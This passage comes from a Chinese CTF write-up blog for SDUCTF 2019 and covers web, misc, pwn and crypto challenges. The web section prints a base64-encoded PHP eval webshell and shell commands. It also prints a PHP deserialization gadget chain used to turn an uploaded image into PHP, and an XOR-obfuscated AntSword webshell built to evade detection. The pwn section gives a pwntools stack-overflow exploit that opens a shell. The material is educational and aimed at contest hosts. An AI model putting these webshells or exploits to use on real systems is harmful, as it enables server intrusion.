&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="keyword">echo</span> $flag;&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"ha,你永远猜不到"</span>;&#125; <span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>得到php源码，百度php extract函数，得知<code>extract()</code>有个变量覆盖漏洞</p><p>由php源码得知所有变量名，直接出入post参数<code>pass=&amp;thepassword_123=</code></p><p>得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web19-3.jpg" alt></p><h3 id="0x13-一句话木马2"><a href="#0x13-一句话木马2" class="headerlink" title="0x13 一句话木马2"></a>0x13 一句话木马2</h3><blockquote><p>题目描述： 在现实世界中，最原始的一句话木马往往会被waf给拦截，所以在使用过程中一般会进行编码或者加密。<br>这里使用最简单的编码，你能成功利用这个后门吗？ </p></blockquote><p>进入网页查看源码</p><p><img src="/2019/11/15/SDUCTF2019-wp/web20.jpg" alt></p><p>百度得知waf是<code>Web Application Firewall</code>的简称。</p><p>这题应该是要绕过waf，进行获取webshell</p><p>由<code>&lt;!--php @eval(@base64_decode($_POST[&quot;cmd&quot;])); --&gt;</code>和题目shell.php得知：实在shell.php执行一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">system(&apos;ls&apos;);</span><br><span class="line">base64&gt;&gt;&gt;c3lzdGVtKCdscycpOw==</span><br><span class="line">system(&apos;cat ffffllllaaaagggg&apos;)</span><br><span class="line">base64&gt;&gt;&gt;c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==</span><br></pre></td></tr></table></figure><p>注：别在网页中解base64，不同网页也许会将字符串先url编码或者Unicode编码在进行base64加密，直接用burpsuite带的base64encode，然后发包即可</p><p><img src="/2019/11/15/SDUCTF2019-wp/web20-1.jpg" alt></p><p>得知flag在同目录下的ffffllllaaaagggg里</p><p><img src="/2019/11/15/SDUCTF2019-wp/web20-2.jpg" alt></p><p>得到flag</p><h3 id="0x14-拼手速"><a href="#0x14-拼手速" class="headerlink" title="0x14 拼手速"></a>0x14 拼手速</h3><blockquote><p>题目描述： 你就是个没有感情的浏览器，但是你的手速够快吗？ </p></blockquote><p>进入页面</p><p><img src="/2019/11/15/SDUCTF2019-wp/web21.jpg" alt></p><p>如题，提交get请求<code>url/?first=cyber</code></p><p><img src="/2019/11/15/SDUCTF2019-wp/web21-2.jpg" alt></p><p>如题，提交post请求<code>sceond=ans</code>（因为计算式每次都会变，所以我这用ans替代，不过也没关系，得到如下页面</p><p><img src="/2019/11/15/SDUCTF2019-wp/web21-3.jpg" alt></p><p>因为每次刷新get页面是计算式都会变，所以我想到了用python的requests的库，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://url/?first=cyber"</span></span><br><span class="line">reflag = <span class="string">'\d\*\d\+\d\*\d'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qa</span><span class="params">()</span>:</span></span><br><span class="line">r1 = requests.get(url)</span><br><span class="line">print(r1.text)</span><br><span class="line">r2 = re.search(reflag,r1.text)</span><br><span class="line">print(r2.group())</span><br><span class="line">ans = eval(r2.group())</span><br><span class="line">print(ans)</span><br><span class="line">ck = str(r1.cookies)</span><br><span class="line">pd = re.search(<span class="string">'PHPSESSID=.* for'</span>,ck)</span><br><span class="line">pd = pd.group().split(<span class="string">' for'</span>)[<span class="number">0</span>]</span><br><span class="line">print(pd)</span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"</span>,</span><br><span class="line"><span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>:pd,</span><br><span class="line"><span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">"second"</span>:ans&#125;</span><br><span class="line">print(header)</span><br><span class="line">r4 =requests.post(url,headers=header,data=data)</span><br><span class="line">print(r4)</span><br><span class="line">print(r4.text)<span class="comment">#flag</span></span><br><span class="line"><span class="keyword">return</span> r4</span><br><span class="line"></span><br><span class="line">aa = qa()</span><br><span class="line"><span class="comment">#print(aa)</span></span><br></pre></td></tr></table></figure><p>跑出来结果如下，得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web21-4.jpg" alt></p><h3 id="0x15-信息泄露"><a href="#0x15-信息泄露" class="headerlink" title="0x15 信息泄露"></a>0x15 信息泄露</h3><blockquote><p>题目描述： 信息泄露了，快拿到它 </p></blockquote><p>猜是php+Git泄露，参考如下文章，访问<code>http://url/.git/HEAD</code>，果然下载了HEAD文件</p><p>文件里写着：<code>ref: refs/heads/master</code>，按如下文章提取了访问<code>url/refs/heads/master</code>，提取了master里的文件：<code>985e6ce910e4cffa9957cf88fd9ac28c13654d6c</code></p><blockquote><p> <a href="https://www.jianshu.com/p/0ea09975169d" target="_blank" rel="noopener">https://www.jianshu.com/p/0ea09975169d</a> </p><p><a href="https://www.cnblogs.com/xhds/p/10884647.html" target="_blank" rel="noopener">https://www.cnblogs.com/xhds/p/10884647.html</a> </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/web23-2.jpg" alt></p><p>然后发现GitHack一波就得到flag了emmmmmmmm</p><h3 id="0x16-web图床"><a href="#0x16-web图床" class="headerlink" title="0x16 web图床"></a>0x16 web图床</h3><blockquote><p>题目描述： 图床开发中，先放出来给你们玩一下 </p></blockquote><p>进入发现是一个登陆网页，想要注入却是登陆失败，那就注册一个试试</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-7.jpg" alt></p><p>注册后登陆进去，是一个可以上传图片的网页，其他啥东西也没有，推测是用图片做一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copya.png/b+<span class="number">1.</span>php  t.png</span><br></pre></td></tr></table></figure><p>但是发现上传上去之后返回的是就是图片，改后缀也无法访问其php文件</p><p>于是尝试了各种图片一句话木马的可能，比如截断，抓包改后缀，发现服务器只接受图片文件，而且无论是什么格式的图片会被改成png格式进行呈现，而且不能上传其他格式的文件。</p><p>其中中间网页貌似崩了一下，看到是ThinkPHP V5.1 ，百度搜其漏洞，发现也没法实现</p><p>其展示的后面解md5得到是172.2.0.2，想着内网地址也没得访问，后面跟着也是文件的MD5值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Index of /upload/fd40c7f4125a9b9ff1a4e75d293e3080/</span><br><span class="line">MD5(172.2.0.2) = fd40c7f4125a9b9ff1a4e75d293e3080</span><br></pre></td></tr></table></figure></p><p>抓包看Cookie解析之后，想改Cookie其中的文件后缀也没用。</p><p>后面实在没思路了，就打算对网站进行一波路径扫描，结果发现了惊喜，有一个<code>www.tar.gz</code>，访问下载文件，发现就是php源码了。</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24.jpg" alt></p><p>不过我还没到能完全审计php源码的高度，我就将其中一部分的源码取用百度搜索，果然搜到了原题</p><blockquote><p><a href="https://www.freebuf.com/column/205789.html" target="_blank" rel="noopener">https://www.freebuf.com/column/205789.html</a> </p><p><a href="https://blog.csdn.net/qq_26406447/article/details/90671853" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90671853</a> </p><p> <a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a> </p></blockquote><p>通过PHP反序列化，得到cookie去使文件转化时，解析成php。</p><p>php发序列号程序如下，用生成的结果替换已有的Cookie即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/md5(user)/md5(filename).png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/md5(user)/xxx.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure><p>不过复现时也遇到了不少麻烦，通过以下代码构造payload然后去替代我们的Cookie，刷新后得到我们修改后缀的php图片马。</p><p>不过在用户已登录时改Cookie时没用，要等到退出账户到登陆界面时设置新建Cookie，再刷新得到如下界面说明成功了</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-8.png" alt></p><p>此时，去访问<code>url/upload/</code>即可看到我们修改的php后缀的文件，同时在上传做php图片马时也遇到了问题</p><p>以下是中国蚁剑生成的免杀马，和png图片拼接在一起上传后发现无法解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISGM</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MaRC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $XYUg = <span class="string">"\xf9"</span> ^ <span class="string">"\x98"</span>;</span><br><span class="line">        $LaqL = <span class="string">"\x57"</span> ^ <span class="string">"\x24"</span>;</span><br><span class="line">        $LXlg = <span class="string">"\xe0"</span> ^ <span class="string">"\x93"</span>;</span><br><span class="line">        $kYoS = <span class="string">"\x7a"</span> ^ <span class="string">"\x1f"</span>;</span><br><span class="line">        $zzTF = <span class="string">"\xaf"</span> ^ <span class="string">"\xdd"</span>;</span><br><span class="line">        $hteZ = <span class="string">"\x9f"</span> ^ <span class="string">"\xeb"</span>;</span><br><span class="line">        $DBlL =$XYUg.$LaqL.$LXlg.$kYoS.$zzTF.$hteZ;</span><br><span class="line">        <span class="keyword">return</span> $DBlL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $LlRV=<span class="keyword">$this</span>-&gt;MaRC();</span><br><span class="line">        @$LlRV(<span class="keyword">$this</span>-&gt;So);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$isgm = <span class="keyword">new</span> ISGM();</span><br><span class="line">@$isgm-&gt;So = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])?base64_decode($_POST[<span class="string">'pass'</span>]):$_POST[<span class="string">'pass'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后尝试自己写了一个，拼接在一起也没有躲开这个错误的厄运</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-3.jpg" alt></p><p>查看图片马的源码发现如下：</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-9.jpg" alt></p><p>可能是png文件尾和php头部拼接，导致一些转义问题，php失去头部<code>&lt;?php</code>导致解析php解析失败</p><p>然后尝试用jpg文件去做一个图片马、上传，果然成功了</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-2.jpg" alt></p><p>然后用中国蚁剑连上服务器，在根目录下找到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-6.jpg" alt></p><p><img src="/2019/11/15/SDUCTF2019-wp/web24-5.jpg" alt></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><center>Misc</center></h2><h3 id="0x01-Gif"><a href="#0x01-Gif" class="headerlink" title="0x01 Gif"></a>0x01 Gif</h3><blockquote><p>题目描述： Gif你眼神够快吗？ </p></blockquote><p>用StegSolve.jar 打开目标gif，即可逐帧查看，一共六帧，4帧都是flag需要自己拼接。</p><p>拼接完得到flag<code>SDUCTF{Gif_is_very_interesting}</code></p><h3 id="0x02-PDF"><a href="#0x02-PDF" class="headerlink" title="0x02 PDF"></a>0x02 PDF</h3><blockquote><p>题目描述： pdf里面藏了啥？ </p></blockquote><p>跟攻防世界的一题misc一样，随便找个网站将pdf转doc，然后把图片拖开flag就藏在下面。</p><p>或者用一些pdf编辑器也做的到。</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc2.jpg" alt></p><h3 id="0x03-今晚月色美吗"><a href="#0x03-今晚月色美吗" class="headerlink" title="0x03 今晚月色美吗"></a>0x03 今晚月色美吗</h3><blockquote><p>题目描述： 小王同学在路上走路，突然发现小朱同学发了一条朋友圈，配图是美美的月亮。于是小王同学心血来潮，掏出手机也拍了一张照片。你觉得月亮有什么奇怪的地方吗？ </p></blockquote><p>用StegSolve查看，原以为是加密，，没想到是藏在不同色差层。</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc3.jpg" alt></p><h3 id="0x04-聋子听声音"><a href="#0x04-聋子听声音" class="headerlink" title="0x04 聋子听声音"></a>0x04 聋子听声音</h3><blockquote><p>题目描述：</p></blockquote><p>我这边用的是Audacity，据说AU也可以查看，根据题目描述，音频应该不是隐写，而是藏在频谱图里</p><p>查看频谱图就可得flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc4.jpg" alt></p><h3 id="0x05-二进制"><a href="#0x05-二进制" class="headerlink" title="0x05 二进制"></a>0x05 二进制</h3><blockquote><p> 题目描述：看二进制你能看出个什么花样来？ </p></blockquote><p>原本没有思路的，将文件扔进binwalk和foremost跑没跑出东西，用<code>less</code>，<code>more</code>没跑出来，最后自暴自弃用<code>cat</code>一试，flag就出来了，我还以为有什么隐写emmmmmmmmmm</p><p>结果是一堆0加上flag</p><p>另一种办法，用010editor打开，直接搜索flag，得到flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc5.jpg" alt></p><h3 id="0x06-奇怪的压缩文件"><a href="#0x06-奇怪的压缩文件" class="headerlink" title="0x06 奇怪的压缩文件"></a>0x06 奇怪的压缩文件</h3><blockquote><p>题目描述： eva说她给tom发了一张二维码，但是Tom接收文件后觉得不太对劲。 </p></blockquote><p>打开附件PIC.zip，发现里面有四个压缩文件，发现解压不了。扔binwalk跑一波发现是jpeg，直接改后缀得到jpg图片。</p><p>四个压缩文件分别是QRcode四等分，用画图把他们拼一起，获得一张完整的二维码，扫码得到flag。</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc6.jpg" alt></p><h3 id="0x07-zip"><a href="#0x07-zip" class="headerlink" title="0x07 zip"></a>0x07 zip</h3><blockquote><p>题目描述： 这是一个加密的压缩包，你能打开它吗？ </p></blockquote><p><del>发现没有截图，就说下思路把</del>，转手就去把图截了，显示一个password.zip伪加密，用ZipCenOp解开伪加密，看到里面还有一个压缩包</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc7.jpg" alt></p><p>但是压缩包里面是一个图片文件，写着flag不在这</p><p>于是就把里面那个zip拖进010editor查看，发现是隐写一个压缩包，直接看到flag，复制提交就完了</p><p><img src="/2019/11/15/SDUCTF2019-wp/misc7-2.jpg" alt></p><h3 id="0x08-猜拳"><a href="#0x08-猜拳" class="headerlink" title="0x08 猜拳"></a>0x08 猜拳</h3><blockquote><p>题目描述： 猜拳，你能赢过机器人吗？ </p></blockquote><p>又是没有思路的pwn，上网搜索得知python有个pwn库可以计算随机数种子，既然是猜，我就自己找一波规律。</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn2-sjb.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robot: bsj sjb jbs</span><br><span class="line">I can win: jbs bsj sjb</span><br></pre></td></tr></table></figure><p>找规律得知对面出拳是一个循环，自己手动解一波得到flag</p><p>(竟然改成Misc了，果然不是一道pwn题)</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><center>PWN</center></h2><h3 id="0x01-Simple-nc"><a href="#0x01-Simple-nc" class="headerlink" title="0x01 Simple nc"></a>0x01 Simple nc</h3><blockquote><p>题目描述： 你会使用nc命令吗?<br>                    可能是全球最简单的pwn题目 </p></blockquote><p><img src="/2019/11/15/SDUCTF2019-wp/pwn1.jpg" alt></p><p>虽然pwn还没入门，不过这确实是最简单得pwn。</p><p>熟悉nc即netcat命令即可，<code>netcat ctf.sec.sdunet.cn 38849</code>直接连上通过<code>ls,cat</code>命令读取flag</p><h3 id="0x02-StackOverflow"><a href="#0x02-StackOverflow" class="headerlink" title="0x02 StackOverflow"></a>0x02 StackOverflow</h3><blockquote><p>题目描述： 作为程序员怎么会不知道 <a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> </p></blockquote><p>一道基本的栈溢出题目，但是中间的编码问题令人烦躁</p><p>用IDA逆向，看到主函数。</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-3.jpg" alt></p><p>进入hello()函数可以看到如下：其中有get函数</p><p>根据<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctf-wiki</a>的pwn的基本教程的get栈溢出就可以做出来</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-4.jpg" alt></p><p>还在其中找到success，这应该就是我们getshell的函数</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-2.jpg" alt></p><p>根据ctf-wiki构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"ctf.sec.sdunet.cn"</span>,<span class="string">"38268"</span>)</span><br><span class="line"><span class="comment">#sh = process(./stackoverflow)</span></span><br><span class="line">success_addr=<span class="number">0x08048486</span></span><br><span class="line"><span class="comment">#payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + <span class="string">'\x86\x84\x04\x08'</span></span><br><span class="line">print(p32(success_addr)</span><br><span class="line"><span class="comment">#out&gt;&gt;&gt;b'\x86\x84\x04\x08'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>用pwntools直接构造exp，getshell，获得flag</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn3.jpg" alt></p><p>其中遇到了一个编码问题：</p><p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-5.jpg" alt></p><p>因为地址用p32转成地址形式为<code>b&#39;\x86\x84\x04\x08</code>所以一直编码不成功，导致payload连接失败不能成功getshell</p><p>在decode时使用<code>&#39;ignore&#39;</code>模式，<code>\x86\x84</code>两个字符会被忽略，说明是非法字符。</p><p><strong>不懂是啥错误！！</strong></p><p>pwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表<code>list[]</code>，list里放所需要拼接的对象 ： <code>payload = flat([&#39;a&#39;*24,&#39;bbbb&#39;,addr])</code></p><p>还有执行elf文件，由于我的系统是64bitUbuntu，执行32bitELF文件需要安装以下包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><center>Crypto</center></h2><h3 id="0x01-Base"><a href="#0x01-Base" class="headerlink" title="0x01 Base"></a>0x01 Base</h3><blockquote><p>题目描述：[<a href="https://baike.baidu.com/item/贝斯/]" target="_blank" rel="noopener">https://baike.baidu.com/item/贝斯/]</a></p><p><a href="https://www.google.com/search?q=ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ" target="_blank" rel="noopener">奇怪的链接</a></p></blockquote><p>题目直接给了两个链接，不过第二个如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ</span><br></pre></td></tr></table></figure><p>直接扔base64去解码，得到flag：<code>flag{base64_is_not_an_encryption_method}</code></p><h3 id="0x02-诡异的数字"><a href="#0x02-诡异的数字" class="headerlink" title="0x02 诡异的数字"></a>0x02 诡异的数字</h3><blockquote><p>题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？<br>他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？<br>11 111 010 000 0 11111 00 000 11111<br>00 10 1 0 010 0 000 1 00 10 110</p><p>flag格式为sductf{xxxxxxxxxx}</p></blockquote><p>既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的<code>str.replae()</code>方法替换成<code>.-</code>即可，即1对应<code>-</code>，2对应<code>.</code>，解得flag。</p><h3 id="0x03-九宫格"><a href="#0x03-九宫格" class="headerlink" title="0x03 九宫格"></a>0x03 九宫格</h3><blockquote><p>题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是……….都有9宫格，所以这个题目炒鸡简单</p><p>7426366432983<br>解出来的明文赋值给x</p><p>flag为 flag{ md5(x+md5(x,16), 32) }<br>(结果没有空格，x+ 表示的是x与另一个字符串进行拼接）</p></blockquote><p>一串数字通过经典的九宫格打出来是<code>山东大学</code>四个字</p><p>然后通过python的<code>hashlib.md5()</code>就可以算出flag</p><p>md5的16位百度得知是截取32位md5中间的16位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">"山东大学"</span></span><br><span class="line">mobj = hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">ans = hashlib.md5(str(s+mobj).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"山东大学"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mobj = hashlib.md5(s.encode(<span class="string">'utf-8'</span>)).hexdigest()[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mobj</span><br><span class="line"><span class="string">'f09383b061bb3c9f'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = hashlib.md5(str(s+mobj).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line"><span class="string">'ecf506190946c4e8d06d53e14191329e'</span></span><br></pre></td></tr></table></figure><h3 id="0x04-键盘追踪"><a href="#0x04-键盘追踪" class="headerlink" title="0x04 键盘追踪"></a>0x04 键盘追踪</h3><blockquote><p>题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点</p><p>rfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn</p><p>还原出明文后请自行拼接flag{}</p></blockquote><p>之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出<code>olloWMe</code>后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时<code>FollowMe</code>，尝试一波，果然是flag。</p><p>（至今为止我都不知道第一个为啥时F</p><h3 id="0x05-宇宙终极问题"><a href="#0x05-宇宙终极问题" class="headerlink" 